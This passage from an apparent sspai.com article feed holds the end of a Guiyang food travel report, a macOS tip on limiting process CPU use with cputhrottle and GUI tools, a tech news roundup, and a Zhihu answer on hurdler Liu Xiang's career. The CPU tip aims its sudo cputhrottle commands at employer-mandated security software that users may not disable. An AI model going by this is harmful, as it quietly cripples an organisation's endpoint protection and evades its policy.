src=\"https://cdn.sspai.com/2021/05/08/bfb49a6ff2ba5f36aeb302bac9317aa4.jpg\"></figure><p>店面一分为二，北边是食用区，南边是料理区，在这儿可以看到煮面全过程。流水线工作，面条一碗一煮，煮好后灌入汤底、肥肠、血旺和脆哨，淋上红油，撒上葱花即可。肠旺面如毛血旺一般香鲜，红而不辣，让我很意外。不过一大早就吃这么油腻的食物，确实有点不太对口。</p>\n<h2>特色黔菜：老凯里酸汤鱼</h2>\n<p>凯里酸汤鱼，贵州凯里黔家菜，是地方特色的酸汤煮鱼。「老凯里酸汤鱼」在贵阳开了诸多店铺，较为出名。酸汤鱼，酸味来自西红柿，口感纯粹清爽，喝多不腻，但也不如海底捞的番茄汤更适入口。鱼肉选了黄腊丁，还可以选江黄鱼，现杀现煮，肉质鲜嫩。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/05/08/1ae675dd479c9a8e2aa4ca6fe00f7c84.jpg\"></figure><p>不过酸汤鱼的灵魂还靠酸汤蘸水，由五种辣椒制成，加入带有特殊气味的木姜子增香。鱼肉蘸上酸汤蘸水，尝一口舌尖舌中是咸鲜香味，辣到舌两侧再到舌根，直冲喉咙，在滚烫鱼肉的激发下，辣味如排山倒海之势袭来，是一种浑厚的辣。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/05/08/f608c762c34ed18ed04b51dcb889de63.jpg\"></figure><p>「老凯里酸汤鱼」店里还会循环播放一首洗脑歌曲，歌词似乎是「来贵州 爽贵州 离开贵州想贵州」，就在这样的欢迎氛围中，我们吃完了酸汤鱼。说的「爽」字，你会发现描述贵州最常见的词是「爽爽」。贵州的气候温暖湿润，夏季凉爽，平均气温在 22℃～25℃ 之间，爽爽贵州说的就是凉爽。Apple 把数据中心放在贵州也可以理解了。</p>\n<h2>特色小吃：豆腐圆子</h2>\n<p>豆腐圆子，地方名小吃，现在属「雷家豆腐圆子」最出名。</p>\n<p>做法是豆腐泥加入五香粉料揉成团，再油炸成表皮褐黄，开一小口，填入馅料。豆腐圆子全家福，四枚圆子馅料皆不同，原味、虾仁、酸菜猪肉、香菇鲜肉。外皮的口感像臭豆腐的表皮，带一点豆腐气，但加点蘸水（又是它），灌进馅料也好，蘸点表皮也好，能解了豆腐气，又加上酸辣鲜香的风味。</p>\n<p>不过看着豆腐圆子个头不算小，但里面的馅料竟然意外地干瘪，让这豆腐圆子看起来像是美食节摊位上「虚张声势」的小吃了。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/05/08/eca21e28c08769276b04cabb9167dcbd.jpg\"></figure><h2>名称和吃法都很独特：丝娃娃</h2>\n<p>丝娃娃，也是贵阳传统特色小吃，本质是素春卷，即面皮卷素菜丝。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/05/08/f17f077bb792f9cf5a872353b4bfc7a8.jpg\"></figure><p>「杨姨妈丝娃娃」也在贵阳开了很多分店，素菜丝有 12 样，包括豆芽、海带、折耳根、香菜、鸡蛋面、土豆丝、黄瓜丝等，红黄白黑各种颜色都有。丝娃娃的取名来自它的吃法，要将面皮和素菜丝卷成卷，露出蔬菜，看起来像个娃娃的襁褓。听起来挺瘆人的，还得把这「襁褓」给吃了。</p>\n<p>素菜卷没有味道，全靠汤料增添风味。汤底是是生姜、大蒜煮的老原汤，加麻油、醋、香油、木姜子油、花生碎和辣椒面。把这蘸水舀一勺倒一点素菜卷里即可食用，素菜脆嫩，酸辣爽口。</p>\n<p>「杨姨妈丝娃娃」用的是手工面皮，肉眼可见的薄，当然容易有漏缝，特别容易漏汤湿手。后来直树说了一个不漏汤又好吃的办法，那就是捞蘸水的时候捞料不捞汤，确实受用。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/2021/05/08/83506a6ad4f53cca3297d6c9d67aaacb.jpg\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/05/08/2b40612de4f27237d1f190b12d13abf2.jpg\" alt=\"\"></figure><p>时间已经是下午三点，店里没什么客人。店员一看我们是外地游客，非常热心地帮我们调汤料，教授吃法，好评。</p>\n<h2>小结</h2>\n<p>时间太短，来贵州只有两天时间，只能在贵阳转转，找些特色小吃。如果时间充足，其实我更想去千户苗寨住上一晚，体验苗族人民的有趣生活，希望以后有机会再去吧。</p>\n<p>隐藏玩法：从杭州萧山机场出发，可以在国内出发 9 号门附近的中国邮政盖到邮戳以及两枚萧山机场纪念章。但是贵阳龙洞堡机场没有设立中国邮政，只能去市区的邮政局敲章，而且需要注意的是可能必须使用现金支付邮票。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/05/08/c1bf8fd0fad0c474b58ffad57fd9af2f.jpg\"></figure><p>出行费用：本次贵阳两日游共计花费 728.9 元。</p>\n<hr>\n<ul>\n<li><a href=\"https://sspai.com/post/66203\" target=\"_blank\">快乐飞旅行报告 01：广州的早茶可以从早喝到晚</a></li>\n<li><a href=\"https://sspai.com/post/66285\" target=\"_blank\">快乐飞旅行报告 02：除了武汉特色小吃，还有惬意的土耳其咖啡店</a></li>\n<li><a href=\"https://sspai.com/post/66445\" target=\"_blank\">快乐飞旅行报告 03：故宫的花开了</a></li>\n<li><a href=\"https://sspai.com/post/66183\" target=\"_blank\">快乐飞旅行报告 04：我低估了沈阳人民对于「小份」的定义</a></li>\n</ul>\n","link":"https://sspai.com/post/66510"},{"title":"一日一技｜macOS 如何限制进程 CPU 占用","date":"2021-06-30 03:32:37","description":"\n<h3><strong>Matrix 首页推荐</strong></h3>\n<p><a href=\"https://sspai.com/matrix\">Matrix</a> 是少数派的写作社区，我们主张分享真实的产品体验，有实用价值的经验与思考。我们会不定期挑选 Matrix 最优质的文章，展示来自用户的最真实的体验和观点。</p>\n<p>文章代表作者个人观点，少数派仅对标题和排版略作修改。</p>\n<hr>\n<blockquote><p>很早之前大家就发现，macOS 的活动监视器真的就只是一个监视器，并不能像 Windows 的任务管理器那样可由用户手动设置进程的优先级。但当我们真的有这样的需求时，该怎么办呢？</p></blockquote>\n<p>我们知道，其实苹果的 macOS 是一个半开半闭源的操作系统，大致来讲，GUI 部分是闭源的，这也是 macOS 的精髓；核心系统部分（<a href=\"https://github.com/apple/darwin-xnu\">darwin-xnu</a>）是开源的。这使得用户或者说开发者依然有机会进行系统调用，以实现需求——限制某个进程的 CPU 资源占用。</p>\n<p>也许你会好奇，什么人会有这种需求呢？当某些公司强制要求员工们安装「xx 安全软件」并且时不时还在后台疯狂扫描文件吃 CPU，还不准你关闭和卸载的时候，你就有这个需求了。</p>\n<h2>方案一：cputhrottle</h2>\n<p>这个小工具没有 GUI，是个很轻便的命令行工具。从介绍便知：</p>\n<blockquote><p>cputhrottle is a small OS X command-line utility designed to limit the CPU usage of a process to which it attaches.</p></blockquote>\n<p>作者在其官方页面提供了源码下载和编译好的二进制执行文件。原本我以为这种 OS X 时代的软件已经不适用于现在版本的系统了，结果仍然可用，这估计得益于稳定的内核带来的良好兼容性（基本不会有哪个 OS 内核经常改系统调用的）。</p>\n<p>在下载 <a href=\"http://www.willnolan.com/cputhrottle/cputhrottle.gz\">cputhrottle.gz</a> 解压后，我们需要先给予执行权限：</p>\n<pre class=\"language-bash\"><code>chmod +x cputhrottle</code></pre>\n<p>然后就可以直接使用了，第 1 个参数是进程的 pid，第 2 个参数是最大 CPU 占用百分比，假设某安全软件进程 id 为 2333，你只准它最多吃你 1% 的 CPU：</p>\n<pre class=\"language-bash\"><code>sudo ./cputhrottle 2333 1\n\n# 一般来说，你可以用 ps 命令来查看进程的 pid\nps -ef\n# 如果太多了不好找，可以筛选一下，前提是你要知道它可能的名字\nps -ef | grep \"xx 安全软件或者它的英文名 \"</code></pre>\n<p>这样就能保证它又不被杀死，还不拖慢你的电脑，可谓 「求死不得，求生不能」。为了使用方便，我们可以把执行文件放到 <code>/usr/local/bin</code> 目录下面，以后就可以在任意目录下直接执行了：</p>\n<pre class=\"language-bash\"><code>mv cputhrottle /usr/local/bin\n# 以后可作为全局命令使用\nsudo cputhrottle 2333 1</code></pre>\n<p>然而，在执行命令后，由于程序内部是死循环逻辑，所以会占用当前终端。更优雅的做法当然是让它到后台去执行，不影响我们终端的继续使用：</p>\n<pre class=\"language-bash\"><code>sudo cputhrottle 2333 1\n# 执行命令后按下 control 和 Z，以挂起进程，终端会提示如下\n# ^Z\n# [1]  + 12345 suspended  sudo cputhrottle 2333 1\n\n# 然后接着在终端输入 bg，会提示进程继续执行，这样就到后台\nbg\n# [1]  + 12345 continued  sudo cputhrottle 2333</code></pre>\n<p>如果觉得 bg 这种方式比较麻烦，也可直接用 nohup 命令：</p>\n<pre class=\"language-bash\"><code>sudo nohup cputhrottle 2333 1 &amp;</code></pre>\n<p>上述 12345 是举例，它是你执行 cputhrottle 命令的进程 id，当你不再需要限制 2333 进程的 CPU 占用时，可以 kill 掉它：</p>\n<pre class=\"language-bash\"><code>sudo kill 12345</code></pre>\n<h2>方案二：AppPolice</h2>\n<p>上面的方案一比较原始，比较熟悉终端的同学可以试试，适合喜欢自己写命令脚本的配合使用。后面的方案都是带 GUI 的软件了，适合普通用户。</p>\n<p>AppPolice 和 cputhrottle 一样，也是开源的，2016 年的老古董软件了，亲测也可用。在其 GitHub 仓库 <a href=\"https://github.com/AppPolice/AppPolice/releases/tag/v1.1\">下载 dmg</a> 后，安装就能用了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/19/27a4c9274d4763ad515acd0e4e79e4d2.png\"><figcaption>图标还挺有趣的……红蓝应该是 Police 的配色</figcaption></figure><p>运行后可以直接控制每个应用进程的 CPU 占用，最大就是无限制，相比命令工具，的确还是很方便的。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/19/d4d0922786f67ebaee1880e460e31831.png\"></figure><h2>方案三：App Tamer</h2>\n<p>此软件不是开源的，并且是付费软件，亲测也可用，从 UI 和功能上面看起来比方案二更成熟一点。安装之后首次打开会提示安装必须的附属工具。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/19/7ff396879063f03b5517b892bbb1bce4.png\"></figure><p>首次使用还有引导页面，做了一些基本功能的介绍。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/19/3c7289b8a8038bef7d21d028473ecf88.png\"></figure><p>其实使用起来和上述的 AppPolice 差不多，都是可以手动限制每一个进程的 CPU 最大占用。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/19/cd073760957706a6ac0394f672bf1f8f.png\"></figure><p>并且还提供了全局开关，在不用退出的情况下关闭限制，需要的时候再打开。各种功能也是要丰富得多，但基本上我这一张截图也就体现完了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/19/abe32ad957d84e9155344520b038795a.png\"></figure><p>总体来说要比前面两个方案完美很多。不过正版的价格也不菲呢，14.95 刀。</p>\n<h2>方案四：Turbo Boost Switcher</h2>\n<p>这个软件严格意义上来说和上面三者不是一个意思，它主要是开关 Intel 处理器的 Turbo Boost 的（<code>Enable / Disable Turbo Boost feature on demand.</code>），后者即英特尔的睿频技术（简单理解为自动超频），关它说白了也是为了省电，让 CPU 处于低频状态。</p>\n<p>所以不是用来限制进程 CPU 占用的，而是全局节能的。我觉得挺神奇的，就放到这里了，看来用户的需求真是千奇百怪呢。</p>\n<h2>资源</h2>\n<ul>\n<li><a href=\"http://www.willnolan.com/cputhrottle/cputhrottle.html\">cputhrottle</a></li>\n<li><a href=\"https://github.com/AppPolice/AppPolice\">AppPolice</a></li>\n<li><a href=\"https://www.stclairsoft.com/AppTamer/\">App Tamer</a></li>\n<li><a href=\"http://tbswitcher.rugarciap.com/\">Turbo Boost Switcher</a></li>\n</ul>\n<h2>探索</h2>\n<p>由于 cputhrottle 的源码比较少，我就稍微看了看，发现核心逻辑还是不复杂的，会根据指定进程的 CPU 使用时间来采样，计算出需要控制的占比，最终通过系统调用（Mach 内核 task 相关的接口，这个 task 在 macOS 的内核中相当于进程的概念）来挂起 task，并休眠一定的时间，达到让出 CPU 资源的目的。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/19/67388dc4e7fc24b22503d0993b8e0999.png\"></figure><p>&gt; 下载少数派 <a href=\"https://sspai.com/page/client\">客户端 </a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号 </a>，了解更妙的数字生活 🍃</p>\n<p>&gt; 想申请成为少数派作者？<a href=\"https://sspai.com/apply/writing\" target=\"_blank\">冲！</a></p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/67331"},{"title":"派早报：Nikon 微单 Z fc 正式发布、HP 推出其最轻消费笔记本产品 Pavilion Aero 13","date":"2021-06-30 00:54:24","description":"\n<h2>Nikon DX 格式微单数码相机 Z fc 正式发布</h2>\n<p>6 月 29 日，Nikon 正式发布 DX 格式微单数码相机 Z fc，该相机采用了传统的外观设计，搭载 1 个圆形目镜、3 个拨盘和机身顶部面板。并配备 20 种创意优化校准选项，通过为主题选择灰度、色调和饱和度等不同的参数，可以表现多样化的氛围。也支持尼享 SnapBridge 应用程序，提供 2 种自动连接模式。售价 6499 元起，预计 2021 年 7 月末开始销售。<a href=\"https://weibo.com/2142312651/Kmp2oEBJ8?layerid=4653394649678146&amp;type=comment#_rnd1625006849830\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/30/article/35a26397796c223d64c9f934a24a245a\"></figure><h2>Nokia 105 4G 经典手机正式发布</h2>\n<p>6 月 29 日，Nokia 105 4G 经典手机正式开启预售，该设备搭载 UNISOC T107 轻量级芯片，支持双开双待 4G 全网通以及 VoLTE 高清语音通话，内置支付宝的二维码以及条形码的移动支付。本次共提供黑色、蓝色、红色三种配色，售价 199 元。<a href=\"https://weibo.com/1660811367/KmpP7d6B7?type=comment#_rnd1625007397301\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/30/article/71c24a292dfad8b49e494c02d1f40039\"></figure><h2>Apple 推出国际系列 Apple Watch 表带</h2>\n<p>6 月 29 日，Apple 更新 Newsroom 信息，宣布推出国际系列 Apple Watch 表带，包括 22 种采用多彩设计、代表全球各地 22 个国家的限量版回环式运动表带。国际系列回环式运动表带将在下列国家发售：澳大利亚、比利时、巴西、加拿大、中国、丹麦、法国、德国、英国、希腊、意大利、牙买加、日本、墨西哥、荷兰、新西兰、俄罗斯、南非、韩国、西班牙、瑞典和美国。<a href=\"https://www.apple.com.cn/newsroom/2021/06/apple-watch-international-collection-bands-show-love-of-country/\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/30/article/76fe37bcd8de649d34c620d15c824aa3\"></figure><h2>HP 推出其最轻消费笔记本产品 Pavilion Aero 13</h2>\n<p>HP 于 6 月 29 日正式推出其最轻消费笔记本产品 Pavilion Aero 13，其重量不到 1 公斤，采用铝镁材料打造，处理器上采用了 AMD 最新带有 AMD Radeon 显卡的 Ryzen 7 5800U 移动处理器，一次充电可以提供 10.5 小时的电池续航时间，屏幕采用了 13.3 英寸的 IPS 屏幕，分辨率达到了2.5K，比例为 16:10，覆盖 100% 的 sRGB 色域，颜色上提供玫瑰金、暖色金、陶瓷白以及天然银四种配色，其售价为 749 美元，7月开始发售。<a href=\"https://www.neowin.net/news/hp-announces-pavilion-aero-13-laptop-with-a-compact-and-light-metal-chassis/?utm_source=feedburner&amp;utm_medium=feed&amp;utm_campaign=Feed:+neowin-main+(Neowin+News)\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/30/article/ee82399e197885ac185cf9d140b8c515\"></figure><h2>新款 AirPods 和 MacBook 产品或许今年晚些时候推出</h2>\n<p>据《经济时报》在其最新的报道中称，Apple 供应商新日兴为 MacBook 和 AirPods 供应轴承产品，其正在抓紧增加产能以及招聘员工，来为满足 Apple 对新 AirPods 以及至少一台新 MacBook Pro 的订单，预计今年 MacBook 出货量将同比增长 15% ，达到 2300 万台，而同时 AirPods 则预计为 3000万台。<a href=\"https://appleinsider.com/articles/21/06/29/apple-suppliers-gearing-up-for-new-airpods-macbook-pro-releases-in-late-2021?utm_medium=rss\" target=\"_blank\">来源</a></p>\n<h2>GitHub 和 OpenAI 推出新 AI 工具，可自己生成代码</h2>\n<p>GitHub 和 OpenAI 于6 月 29 日推出一款名为 Copilot 的新 AI 工具，该工具可以是通过 Visual Studio Code 编辑器自动完成代码片段，根据 GitHub 说法，该工具不仅是模仿之前见过的代码，相反会自己分析已经编写的代码并匹配生成新的代码，包括调用特定的函数等，项目实例显示这包括自动编写代码导入推文，绘制散点图以及获取 Goodreads 评级等。<a href=\"https://copilot.github.com/\" target=\"_blank\">来源</a></p>\n<h2><strong>你可能错过的好文章</strong></h2>\n<ul>\n<li><a href=\"https://sspai.com/post/67046\" target=\"_blank\">以爱之名，和最重要的人一起整理</a></li>\n<li><a href=\"https://sspai.com/post/67466\" target=\"_blank\">手中的 Bose 还想留着，但它已经没那么香了：WF-1000XM4 上手体验</a></li>\n<li><a href=\"https://sspai.com/prime/story/vol01-timemator\" target=\"_blank\">强大和易用并存的时间记录应用：Timemator</a></li>\n<li><a href=\"https://sspai.com/post/67469\" target=\"_blank\">老显卡也能拥有的新体验：AMD FSR 实测</a></li>\n</ul>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\" target=\"_blank\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\" target=\"_blank\">少数派公众号</a>，解锁全新阅读体验 📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\" target=\"_blank\">正版软件</a>，少数派为你呈现 🚀</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/67479"},{"title":"为什么中国运动员运动寿命短？","date":"2021-06-29 23:08:07","description":"<div>\n<div>\n<div>\n<img src=\"https://pic2.zhimg.com/v2-eb5d6b469b19cbd19b27cb2bbf557619_l.jpg?source=8673f162\"><span>运动分子，</span><span>体育科普/运动知识/装备测评/赛事报道/选手故事/</span>\n<a href=\"https://www.zhihu.com/question/50191573/answer/1953518631\" hidden>阅读原文</a>\n</div>\n<div>\n<p>题目里，姚明、刘翔和李娜放整个中国体育史上，都是各自领域独一无二、甚至完全没有接近者的存在。</p>\n<p>放更大的范围，他们也都是世界级（world-class）的选手，全世界、整个人类历史上都不多见——<strong>用这一类运动员作为分析样本，其实意义并不大。</strong></p>\n<p>不过还是以其中的一位，刘翔为例，稍微展开说说。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-5ac0f8033935fa9773ee01c41222a141_720w.jpg?source=8673f162\" alt=\"\"></figure><p>伤病伴随了刘翔的整个职业生涯，最主要两个部位，大腿和跟腱 / 脚跟。其中跟腱 / 脚跟部位的伤堪称是他生涯的“阿基里斯之踵”，因为本身脚跟骨比别人更突出，只要有高强度训练，就一定会出状况，没法根治，只能缓解。</p>\n<p>——<strong>可能很多人不知道，刘翔后跟 / 跟腱部位的伤病在 2004 年雅典奥运会前就已经出现，也被确诊会反反复复、困扰其整个职业生涯。</strong></p>\n<figure><img src=\"https://pic2.zhimg.com/v2-00a936453e7c2381d2db3ed2da29f775_720w.gif?source=8673f162\" alt=\"\"></figure><p>即便如此，刘翔在自己职业生涯依然创造了两次巅峰，且这两次巅峰持续的时间都非常之长——几乎抛开两次严重受伤（都有各自代表性的赛事，2008 北京奥运会和 2012 伦敦奥运会），<strong>刘翔都很快恢复到曾经的水准。</strong></p>\n<figure><img src=\"https://pic1.zhimg.com/v2-68c6fd260a4e00b794436ebd61d86250_720w.jpg?source=8673f162\" alt=\"\"><figcaption>2004 年刘翔雅典夺冠，也带乱了杜库雷的节奏</figcaption></figure><figure><img src=\"https://pic4.zhimg.com/v2-486be71dc028c12f5a4b058f8a98c994_720w.jpg?source=8673f162\" alt=\"\"><figcaption>2012 年伦敦奥运会，刘翔跟腱断裂，在第一个栏架意外摔倒，以这样一种未完成的方式结束了自己的最后一场比赛</figcaption></figure><p>刘翔生涯中段大家都很了解了，回顾一下他的起点与终点——</p>\n<p>刘翔 1999 年、不到 16 岁正式跟着孙海平练跨栏，3 年后（2002 年）就创造了 110 米栏世界青年纪录 + 亚洲纪录（13 秒 12），同年釜山亚运会（13 秒 27）摘金。</p>\n<p>——所以<strong>从 19 岁开始，刘翔就已经是全世界最顶级的 110 米栏选手。</strong>第二年圣但尼田径世锦赛 13 秒 23 摘铜，也是含金量极高的一块奖牌。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-ff11a8a6838aa1592f3e572015141588_720w.jpg?source=8673f162\" alt=\"\"><figcaption>2003 圣但尼世锦赛，20 岁的刘翔 13 秒 23 仅次于特拉梅尔和偶像阿兰约翰逊，拿到含金量极高的铜牌</figcaption></figure><p>刘翔最后一场正式比赛完赛，是 2012 年 7 月 13 日的钻石联赛伦敦站，距离奥运不到两周时间。</p>\n<p>那一天也是他 29 岁的生日。</p>\n<p>比赛有雨，刘翔预赛 13 秒 27 轻松获得小组第一名。两个小时后的决赛，他因为「肋间有些岔气」宣布不跑。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-315d96cb28bf03482d9c8a206e7d7a64_720w.jpg?source=8673f162\" alt=\"\"><figcaption>2012 年 7 月 13 日钻石联赛伦敦站，当天是刘翔 29 岁生日，也是他职业生涯最后一次完成比赛</figcaption></figure><p>不要认为 13 秒 27 就是当时刘翔的实力了。预赛他明显收着，也谨慎起见才放弃了决赛。</p>\n<p>备战伦敦奥运会前，刘翔已经连续参加了三站钻石联赛都跑出了很好的成绩：</p>\n<ul>\n<li>5 月 6 日川崎站 13 秒 09，2012 年的第一场室外赛，奥运会前的一堂“大运动量训练课”；</li>\n<li>5 月 19 日上海站 12 秒 97，打破了 12 秒 99 的赛会纪录；</li>\n<li>6 月 3 日尤金站 12 秒 87，在超风速情况下追平了世界纪录。</li>\n</ul>\n<p>——所以只要伤病不严重到无法出战，实际上当时<strong>已处于职业生涯后期的刘翔，完全具备跑进 13 秒、甚至再次冲击世界纪录的能力。</strong></p>\n<p>依然是当时全世界最有竞争力的 110 米栏选手，丝毫不比罗伯斯、奥利弗、梅里特们逊色。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-d396e4069c261463b4df217fadae9a12_720w.jpg?source=8673f162\" alt=\"\"><figcaption>2012 年 5 月 19 日钻石联赛上海站，12 秒 97，打破了 12 秒 99 的赛会纪录</figcaption></figure><p>不夸张的说，<strong>从 19 岁一直到 29 岁，整整十年间，除去伤病和恢复调整外，刘翔一直保持了非常强大的竞争力。</strong></p>\n<p>这种竞争力不光指洲际级大赛能进入最后决赛（前 8 名），还包括站台、夺金、破纪录，相当的恐怖。</p>\n<p>其中几个巅峰节点：</p>\n<ul>\n<li>21 岁，2004 年雅典奥运会，12 秒 91 秒夺金，打破奥运赛会纪录 + 追平世界纪录；</li>\n<li>23 岁，2006 年国际田联超级大奖赛洛桑站，12 秒 88，刷新封尘 13 年之久的世界纪录；</li>\n<li>24 岁，2007 年大阪田径世锦赛，第九道跑出 12 秒 95 夺冠，成就奥运冠军 + 世界冠军 + 世界纪录大满贯；</li>\n<li>26 岁，2009 年钻石联赛上海站，与特拉梅尔成绩相同都是 13 秒 15，只因有效部位稍慢触及终点，亚军；同年，全运会 + 亚锦赛双双实现三连冠；</li>\n<li>28 岁，2011 年大邱世锦赛，被罗伯斯打手干扰，13 秒 27，递补拿到银牌；</li>\n<li>29 岁，2012 年钻石联赛上海站，12 秒 97 破赛会纪录，近 4 年后再次跑进 13 秒 + 创造了当时年度最好成绩；同年钻石联赛尤金站，12 秒 87 超风速(2.4 米 / 秒)追平世界纪录（成绩有效，纪录不被认可）。</li>\n</ul>\n<p>巅峰长期且稳定，而且是很难得的，从永久性伤病 + 两次严重伤病中，依然非常快速的恢复回巅峰状态。</p>\n<p>——很难说全世界历史级的选手中，能找出多少刘翔这样的；认为刘翔的运动寿命短，似乎也很难站住脚。</p>\n<figure><img src=\"https://pic4.zhimg.com/v2-47eea1097c324eb346e9881f1dea5230_720w.jpg?source=8673f162\" alt=\"\"><figcaption>2011 年钻石联赛尤金站，奥利弗超水准发挥 12 秒 94 击败刘翔夺冠创造赛会纪录，第二年刘翔又刷新了赛会纪录</figcaption></figure><p>对应的，再看看刘翔（1983 年）的同期主要竞争对手们。</p>\n<p>特伦斯·特拉梅尔（1978 年）、大卫·奥利弗（1982 年）、大卫·佩恩（1982 年）、拉吉·杜库雷（1983 年）、阿里斯·梅里特（1985 年）、戴龙·罗伯斯（1986 年）、杰森·理查森（1986 年）：</p>\n<p>特拉梅尔的生涯从 2000 年悉尼奥运会 13 秒 16 摘银开始，一直到 2010 年都保持了很高竞争力。最好成绩 12 秒 95。北京奥运会前伤退，雅典奥运会和大阪世锦赛则都输给刘翔，生涯 2 枚奥运银牌 +3 枚世锦赛银牌；</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-accb4c20d38a91d0c5d0d5ef10276998_720w.jpg?source=8673f162\" alt=\"\"><figcaption>刘翔 vs 特拉梅尔</figcaption></figure><p>奥利弗生涯开始较晚，直到大学毕业后才正式确定跨栏主项，从 2005 年 -2015 年都保持了较高的水准，其中有六年排名世界前三、两年排名第一（2010 年和 2013 年）。生涯 1 枚世锦赛金牌 +1 枚奥运会铜牌。</p>\n<p>2010 年钻石联赛上海站时，奥利弗曾击败刘翔并以 12 秒 99 创造赛会纪录，但两年后刘翔又以 12 秒 97 重新刷新；</p>\n<figure><img src=\"https://pic4.zhimg.com/v2-170345f1b273f7643e7e8b6c613264e4_720w.jpg?source=8673f162\" alt=\"\"><figcaption>刘翔 vs 奥利弗</figcaption></figure><p>大卫·佩恩 2004-2009 年间比较有竞争力，生涯 3 枚世锦赛铜牌 +1 枚奥运会银牌。与刘翔直接交手代表赛事是 07 年的大阪世锦赛，刘翔战胜特拉梅尔和他，实现个人全满贯；</p>\n<figure><img src=\"https://pic4.zhimg.com/v2-40ca4082a62e7be314cf39a7c884a486_720w.jpg?source=8673f162\" alt=\"\"><figcaption>2007 年大阪世锦赛，大卫佩恩 13 秒 02 摘铜，输给刘翔的 12 秒 95</figcaption></figure><p>与刘翔同年的杜库雷，成名比刘翔还要更早些，一度被视为是刘翔的一生之敌。2004 年雅典，杜库雷被刘翔带乱节奏而后摔倒，也是很多人第一次认识这位法国小伙。</p>\n<p>但杜库雷的生涯也是起起伏伏，尽管退役更晚，实际 2012 年起就已经告别自己的巅峰。杜库雷巅峰具备跑进 13 秒的能力（最佳 12 秒 97），奥运会的发挥都并不理想，也从来没有拿到过奥运会奖牌（最好是北京奥运会的第四）。</p>\n<p>赫尔辛基世锦赛 110 米栏，杜库雷 13 秒 07 夺冠，刘翔 13 秒 08 亚军，老将阿兰约翰逊 13 秒 10 季军，竞争相当激烈。</p>\n<figure><img src=\"https://pic4.zhimg.com/v2-fe395d8ade61e8fb561be0e9c9cf9c4a_720w.jpg?source=8673f162\" alt=\"\"><figcaption>刘翔 vs 杜库雷</figcaption></figure><p>梅里特，迄今 110 米栏 12 秒 80 世界纪录保持者，生涯主要从 2011 年 -2017 年，有世界纪录有奥运金牌（伦敦）、独缺世锦赛没能实现大满贯。</p>\n<p>梅里特与刘翔的巅峰几乎是错开，直接对话并不多。两人曾在 2011 大邱世锦赛有直接交手，当时梅里特拿到第五；</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-289533b6b13368264a880b35eaf302f4_720w.jpg?source=8673f162\" alt=\"\"><figcaption>萝卜丝非常糟糕的毁了当时状态相当出色的刘翔的发挥，而那会梅里特（最左）刚刚开始进入自己生涯的最好状态</figcaption></figure><p>罗伯斯曾在 2008 年以 12 秒 87 刷新刘翔 12 秒 88 的世界纪录，算是刘翔同期最主要的对手，生涯与刘翔也有多次直接交手，包括大邱那次打手被取消金牌，也彻底无缘个人的大满贯。罗伯斯生涯主要闪光点从 2004 年开始，2006 年 -2010 年成绩比较有竞争力，和刘翔一样伦敦奥运会 DNF，淡出舞台。</p>\n<p>2008 年北京奥运会本来被视为罗伯斯和刘翔两人的巅峰对决，最终刘翔退赛，罗伯斯 12 秒 93 轻松夺冠。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-db8df43a68dd6d8f76b7c83b62d56d2b_720w.jpg?source=8673f162\" alt=\"\"><figcaption>明显带有刻意阻拦动作的打手，也让罗伯斯被取消了这块世锦赛金牌</figcaption></figure><figure><img src=\"https://pic1.zhimg.com/v2-b37b1390a9a014e5a834358217d21c74_720w.gif?source=8673f162\" alt=\"\"></figure><p>杰森·理查森生涯前期很多小伤病外加大学学业，正式在 110 米栏上表现天赋已经是 2010 年后的事了。他也从大邱世锦赛打手事件中递补得到金牌（13 秒 16），并在次年伦敦奥运会拿到银牌（13 秒 04）。最好成绩 12 秒 98。</p>\n<figure><img src=\"https://pic4.zhimg.com/v2-2ef1fed75945c069473a6a3cc46fb6ea_720w.jpg?source=8673f162\" alt=\"\"><figcaption>刘翔 vs 理查森</figcaption></figure><p>——与这些同期的主要竞争对手们相比，刘翔无论是职业生涯的长度、巅峰的高度、巅峰维持时间、获得的荣誉数量、奥运会 / 世锦赛等大赛及钻石联赛等洲际赛事的奖项……都丝毫没有落下风。</p>\n<p>更没有「运动寿命更短」一说。</p>\n<figure><img 